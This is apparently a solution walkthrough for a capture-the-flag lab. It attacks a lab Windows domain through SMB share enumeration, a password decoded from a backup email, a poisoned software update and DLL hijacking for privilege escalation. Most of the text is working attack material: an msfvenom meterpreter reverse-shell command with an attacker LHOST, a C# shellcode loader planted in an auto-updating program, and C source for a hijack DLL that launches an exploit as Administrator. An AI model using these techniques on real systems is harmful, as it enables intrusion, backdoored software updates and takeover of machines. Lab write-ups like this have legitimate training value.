# Noble Craft Solution 

## jdoePassword

- If you did a nmap scan on the 10.5.5.0/24 network, you would find 445 open on 10.5.5.10
    - This is the DC dc-enterprise.local
- Run smbmap -L -H 10.5.5.10 to see what share drives available
- Notice you see a IT folder that is read only and Updates folder that is not accessible
- If you go into the IT folder, you see there are multiple folders but the one you're looking for is Email Backup
- There's a compressed backup of all of the emails on the server
    - Backup.zip
- Unpack, and go into the Data/jdoe/{random letter and number}/{guid}.eml
- cat the file and at the bottom, you'll see the base64 encoded .txt file
- echo the base64 string into a file then decode the file
    - echo "<base64 string>" > file.b64
    - base64 -d file.b64 > file.txt
- cat out the file to find the password
- This is the first flag and leverage into the Updates share

## Automatic Updates

- Going back to the IT share, there's a folder called "Under Development"
- Open the folder and notice there's another folder called "Quick_AD"
    - This is a project that kbuckley is currently working on
- Open the directory, move into Form1.cs
- There's a thread that kicks off when Form1 is loaded
    - It runs the method UpdateThread
    - This looks for any updates and applies them
- Also notice there's an URL: http://enterprise-dc.local/updates/text.xml
    - If you visit this, you'll see how to update the program using this XML
- The XML file is in the Updates share drive and you are able to use your new jdoe credential to edit this file
- With everything laid out, these are the steps to get the user token:
    - Create a C# payload using msfvenom
      - `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f charp`
      - Make sure to note this. You will make a metasploit handler/listener with this information later.
    - Copy the shellcode and place it into the Quick_AD program inside Form1.cs
    - Here's a template of how the shellcode should be executed
    - PLEASE NOTE: You do have to add two includes:
      - ```C#
        using System.IO;
        using System.Runtime.InteropServices;
        ```
      - ```C#
      	[DllImport("kernel32")]
		static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		delegate void WindowsRun();
    		
    	public run()
    	{
    		payload = new byte[] { ENTER SHELLCODE };
    		
			IntPtr ptr = VirtualAlloc(IntPtr.Zero, (IntPtr)payload.Length, (IntPtr)0x1000, (IntPtr)0x40);
			Marshal.Copy(payload, 0, ptr, payload.Length);
			WindowsRun r = (WindowsRun) Marshal.GetDelegateForFunctionPointer(ptr, typeof(WindowsRun));
			r();
			return;
	    }
        ```
        - You should place the method run() into the Form1_Load() method.
    - Copy the .nuget directory and place it in the root of the current user directory
      - C:\Users\User\
    - Go to the file Quick_AD.csproj
    - Increment the last number in the Version, AssemblyVersion and FileVersion
        - 1.0.0.19
    - Build the application
        - Note: there's an example build ps1 file that can really help you out.
        - It's located in the root of Quick_AD called build.ps1
            - dotnet build —configuration Release
        - Zip the files Quick_AD.exe and Quick_AD.dll as Release.zip
        - You might also want to use the Windows box to build this application
    - Mount the Updates share drive
        - This is C:\inetpub\wwwroot\updates\ directory on the Windows machine
    - Move Release.zip into the share, replacing the other Release.zip
    - Edit the test.xml file's Version number to match the Version number you set previously
        - In this case, 1.0.0.19
    - Save the file and wait
        - The thread is on a 30 second timer
        - Depending on where the timer is, you would have to wait but the max amount of time is 30 seconds
    - Set up the listener that you set up for the created Metasploit payload
    - Get a shell, move to C:\Users\kbuckley\Desktop
    - The token is in user.txt

## Privilege Escalation

- In order to get root, we're going to use some LOLBIN and a ProxyDLL
    - SystemPropertiesAdvanced.exe
- Make a new dll file called srrstr.dll
    - Create a c file, srrstr.c
    
    ```c
    #include <windows.h>
    BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpReserved)
    {
    	switch(dwReason)
    	{
    		case DLL_PROCESS_ATTACH:
    			WinExec("C:\\Users\\kbuckley\\exploit.exe", 0);
    			break;
    		case DLL_PROCESS_DETACH:
    			break;
    		case DLL_THREAD_ATTACH:
    			break;
    		case DLL_THREAD_DETACH:
    			break;
    		
    	}
    	return 0;
    }
    ```
    - Compile this dll on the Windows box and save as srrstr.dll
      - To compile, on the Windows box, go to Start and navigate to the Visual Studio 2019
      - Click on "Developer Command Prompt for VS 2019"
      - Navigate to the location of your C code
      - use the command: 
        ```
        cl /LD srrstr.c
        ```
- Copy the file into C:\Program Files\dotnet
- Admin is on a 5 minute schedule running SystemPropertiesAdvanced.exe
  - You can test this on the Windows box **NOTE NOT NEEDED TO COMPLETE THE LAB**
  - Copy a test dll file into the dotnet directory on the Windows box
  - Open procmon
  - Put on a filter on the process SystemPropertiesAdvanced.exe
  - Scroll down to find the event CREATE FILE and find the reference to srrstr.dll
  - Notice that it looks into different dir's
    - C:\Windows
    - C:\Users\<user that ran the exe>\AppData\Microsoft\MicrosoftApps
    - C:\Program Files\dotnet
- Move the directory into C:\Users\Administrator\Desktop
- The token is in root.txt
